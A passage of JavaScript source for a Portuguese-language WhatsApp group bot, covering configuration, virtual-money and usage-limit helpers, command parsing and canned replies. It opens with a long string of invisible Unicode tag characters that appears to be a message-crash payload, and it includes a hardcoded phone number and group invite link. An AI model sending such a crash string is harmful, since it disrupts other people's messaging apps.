󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥'
NomeBot = settings.NomeBot
NumeroCriador = settings.NumeroCriador
NomeCriador = settings.NomeCriador
multi = false
nopref = true
autoread = true
autocomposing = true
autorecording = false
antipv = false
autoplay = false
//====================[ FIM DA CONFIGURAÇÃO ]====================//

//====================[ APIKEYS ]====================//
HunterApi = settings.HunterApi
akamekey = settings.akamekey
instagramkk = settings.instagram
github = settings.github
prefixx = settings.prefix
apirestt = settings.apirest
//====================[ FIM DAS APIKEYS ]====================//

const time = moment().tz('America/Sao_Paulo').format("HH:mm:ss")
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)} Hora(s) ${pad(minutes)} Minuto(s) ${pad(seconds)} Segundo(s)`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " dias, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hora, " : " horas, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minuto, " : " minutos, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " segundo" : " segundos") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./db/outros_db/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
//====================[ FUNÇÃO DE DINHEIRO ]====================//
               const add_dinheiro_padrão = (sender) => {
        	const obj = {id: sender, dinheiro : 0}
            dinheiro.push(obj)
            fs.writeFileSync('./db/usuário_db/dinheiro.json', JSON.stringify(dinheiro))
        }
                const add_dinheiro = (sender, amount) => {
            let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                dinheiro[position].dinheiro += amount
                fs.writeFileSync('./db/usuário_db/dinheiro.json', JSON.stringify(dinheiro))
            }
        }        
        const verificar_dinheiro = (sender) => {
        	let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return dinheiro[position].dinheiro
            }
        }
          const confirma_dinheiro = (sender, amount) => {
        	let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                dinheiro[position].dinheiro -= amount
                fs.writeFileSync('./db/usuário_db/dinheiro.json', JSON.stringify(dinheiro))
            }
        }
//====================[ FIM DAS FUNÇÕES DE DINHEIRO ]====================//        

//====================[ FUNÇÃO DE LIMIT ]====================//
           const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })            
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./db/usuário_db/limit.json', JSON.stringify(_limit))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./db/usuário_db/limit.json', JSON.stringify(_limit))
            }
        } 
//====================[ FIM DAS FUNÇÕES DE LIMIT ]====================//

module.exports = edward = async (edward, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
	    if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
	    if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && !mek.key.fromMe) {
		nums = mek.participant
        anti_ephemeral_br = "\n".repeat(420)
        tekuss = `\`\`\`BUG EPHEMERAL DETECTADO !!!\`\`\`${anti_ephemeral_br}\`\`\`@⁨${nums.split('@')[0]} Enviou o bug, @⁨${nums.split('@')[0]} Você será expulso!\`\`\`\n`
        edward.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        edward.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = edward.user
		m = simple.smsg(edward, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		edward.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = `${prefixx}`
            } else {
                prefix = prefa
            }
        }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
      const body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
//        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const typeMessage = body.substr(0, 50).replace(/\n/g, '')
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		 const q = args.join(" ");
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const img = fs.readFileSync('./arquivos/img/edward.jpg')
		const verificado = fs.readFileSync('./arquivos/img/verificado.jpg')
		const imgcriador = fs.readFileSync('./arquivos/img/criador.jpg')
 const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []		
 const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag		
	const mentionUser = mention != undefined ? mention.filter(n => n) : []
	tempativado = process.uptime();
	const veloc2 = speed();
	const veloc = speed() - veloc2
		cmhit.push(command)
//====================[ MESS ]====================//		
mess = {
wait: `「 🍁 」 𝙴𝙼 𝙿𝚁𝙾𝙲𝙴𝚂𝚂𝙾...`,
succes: `「 🍁 」 𝚂𝚄𝙲𝙴𝚂𝚂𝙾!`,
error: `「 🍁 」 𝙾𝙲𝙾𝚁𝚁𝙴𝚄 𝚄𝙼 𝙴𝚁𝚁𝙾!`,
lvlon: `「 🍁 」️𝙾𝚂 𝙽𝙸𝚅𝙴𝙸𝚂 𝙵𝙾𝚁𝙰𝙼 𝙰𝚃𝙸𝚅𝙾𝚂.`,
lvloff: `「 🍁 」𝙾𝚂 𝙽𝙸𝚅𝙴𝙸𝚂 𝙵𝙾𝚁𝙰𝙼 𝙳𝙴𝚂𝙰𝚃𝙸𝚅𝙰𝙳𝙾𝚂!!!`,
lvlnul: `「 🍁 」 𝚅𝙾𝙲𝙴 𝙽𝙰𝙾 𝙿𝙾𝚂𝚂𝚄𝙸 𝙽𝙸𝚅𝙴𝙸𝚂!`,
banned: `「 🍁 」 𝚅𝙾𝙲𝙴 𝙵𝙾𝙸 𝙱𝙰𝙽𝙸𝙳𝙾!`,
lvlnoon: `「 🍁 」𝙾𝚂 𝙽𝙸𝚅𝙴𝙸𝚂 𝙴𝚂𝚃𝙰𝙾 𝙳𝙴𝚂𝙰𝚃𝙸𝚅𝙰𝙳𝙾𝚂.`,
rediregis: `「 🍁 」𝚅𝙾𝙲𝙴 𝙹𝙰 𝙴𝚂𝚃𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝙳𝙾 𝙽𝙾 𝙻𝙴𝚅𝙸𝙱𝙾𝚃.`,
noregis: `「 🍁 」\`\`\`SE REGISTRE PARA UTIZAR O BOT!\nUSE *rg\`\`\``, 
stikga: `「 🍁 」𝙰𝙶𝚄𝙰𝚁𝙳𝙴, 𝙴𝙼 𝙲𝙰𝚂𝙾 𝙳𝙴 𝙴𝚁𝚁𝙾, 𝚃𝙴𝙽𝚃𝙴 𝙽𝙾𝚅𝙰𝙼𝙴𝙽𝚃𝙴.`,
linkga: `「 🍁 」𝙾 𝙻𝙸𝙽𝙺 𝙽𝙰𝙾 𝙴 𝚅𝙰𝙻𝙸𝙳𝙾.`,
group: `「 🍁 」𝙴𝚂𝚃𝙴 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝚂𝙾 𝙿𝙾𝙳𝙴 𝚂𝙴𝚁 𝚄𝚃𝙸𝙻𝙸𝚉𝙰𝙳𝙾 𝙴𝙼 𝙶𝚁𝚄𝙿𝙾𝚂.`,
owner: `「 🍁 」SOMENTE PARA O BRUNO🙈`,
ownerg: `「 🍁 」𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝙾 𝙳𝙾𝙽𝙾 𝙳𝙾 𝙶𝚁𝚄𝙿𝙾. `,
admin: `「 🍁 」𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝙰𝙳𝙼𝙸𝙽𝙸𝚂𝚃𝚁𝙰𝙳𝙾𝚁𝙴𝚂!`,
Badmin: `「 🍁 」𝙾 𝙱𝙾𝚃 𝙳𝙴𝚅𝙴 𝚂𝙴𝚁 𝙰𝙳𝙼 𝙿𝙰𝚁𝙰 𝙴𝚇𝙴𝙲𝚄𝚃𝙰𝚁 𝙴𝚂𝚂𝙴 𝙲𝙾𝙼𝙰𝙽𝙳𝙾`,
nsfwoff: `「 🍁 」𝙾 𝙼𝙾𝙳𝙾 𝙽𝚂𝙵𝚆 𝙴𝚂𝚃𝙰 𝙳𝙴𝚂𝙰𝚃𝙸𝚅𝙰𝙳𝙾`,
bug: `「 🍁 」O problema foi relatado ao proprietário, Relatório falsos resultarão em punição`,
wrongf: `「 🍁 」𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝙲𝙾𝚁𝚁𝙴𝚃𝙾!`,
clears: `「 🍁 」𝙾𝚂 𝙲𝙷𝙰𝚃𝚂 𝙵𝙾𝚁𝙰𝙼 𝙻𝙸𝙼𝙿𝙾𝚂.`,
wrongf:`「❌ERROR❌」*\n\n*Formato errado ou o texto esta em branco!!*`,
ban: `KKKKKKKKKKKKK TU FOI BANIDO`,
premium: `「 🍁 」 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝚄𝚂𝚄𝙰𝚁𝙸𝙾𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼`,
Iv: `link inválido!`,
api: `「 🍁 」 OCORREU UM ERRO NA API!`,
				
			only: {
				group: `「 🍁 」𝙴𝚂𝚃𝙴 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝚂𝙾 𝙿𝙾𝙳𝙴 𝚂𝙴𝚁 𝚄𝚃𝙸𝙻𝙸𝚉𝙰𝙳𝙾 𝙴𝙼 𝙶𝚁𝚄𝙿𝙾𝚂.`,
				benned: `「 🍁 」 𝚅𝙾𝙲𝙴 𝙵𝙾𝙸 𝙱𝙰𝙽𝙸𝙳𝙾!`,
				ownerB:  `「 🍁 」𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝙾 𝙱𝚁𝚄𝙽 🙈`,
				premium: `「 🍁 」 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝚄𝚂𝚄𝙰𝚁𝙸𝙾𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼`,
				userB: `「 🍁 」𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙴-𝚂𝙴 𝙿𝙰𝚁𝙰 𝚄𝚂𝙰𝚁 𝙾 𝙱𝙾𝚃\n𝚄𝚂𝙴 :${prefix}rg`,
				admin: `「 🍁 」𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝚇𝙲𝙻𝚄𝚂𝙸𝚅𝙾 𝙿𝙰𝚁𝙰 𝙰𝙳𝙼𝙸𝙽𝙸𝚂𝚃𝚁𝙰𝙳𝙾𝚁𝙴𝚂!`,
				Badmin: 'me da adm desgraça'
}}
			
		//====================[ FIM DO MESS ]====================//
		const botNumber = edward.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? edward.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? edward.user.jid : edward.contacts[mek.sender]
  const pushname = mek.key.fromMe ? edward.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await edward.chats.all()
		const groupMetadata = isGroup ? await edward.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumber.includes(sender)
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntilink = isGroup ? antilink.includes(from) : false
const isNsfw = isGroup ? nsfw.includes(from) : true
		const isAutofigu = isGroup ? autofigurinha.includes(from) : false
	 const isDoc = isGroup ? antidoc.includes(from) : false
	 const isCon = isGroup ? anticon.includes(from) : false
	 const isLoc = isGroup ? antiloc.includes(from) : false
	 const isCat = isGroup ? anticat.includes(from) : false	 	 	 
		const isAntiFake = isGroup ? antifake.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
  const isAntiVO = isGroup ? antiviewonce.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
  const isLevelingOn = isGroup ? _leveling.includes(from) : false
  const isPremium = premium.checkPremiumUser(sender, _premium)
  const isAfkOn = afk.checkAfkUser(sender, _afk)
		const isBanned = ban.includes(sender)
		const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		if (antibot === true) return
		const katalog = (teks) => {
             res = edward.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": `*_© ${NomeBot}_*`, "thumbnail": pperfil, "surface": 'CATALOG' }}, {contextInfo :{text: 'oi',"forwardingScore": 1000000000,isForwarded: true,sendEphemeral: true,"externalAdReply": {"title": `${NomeBot}`,"body": "","previewType": "PHOTO","thumbnailUrl": "","thumbnail": img,"sourceUrl": `https://api.whatsapp.com/send?phone=5555933005901&text=Eay%20gay`},mentionedJid:[sender]},quoted:say1})
             edward.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = edward.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '5555933005901-1633605637@g.us', "inviteCode": 'https://chat.whatsapp.com/EEsFptL84q0JyQwAfvwPRg', "groupName": `${NomeBot}`, "footerText": `*_© ${NomeBot}_*`, "jpegThumbnail": pperfil, "caption": teks}}, {quoted:finv})
            edward.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await edward.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
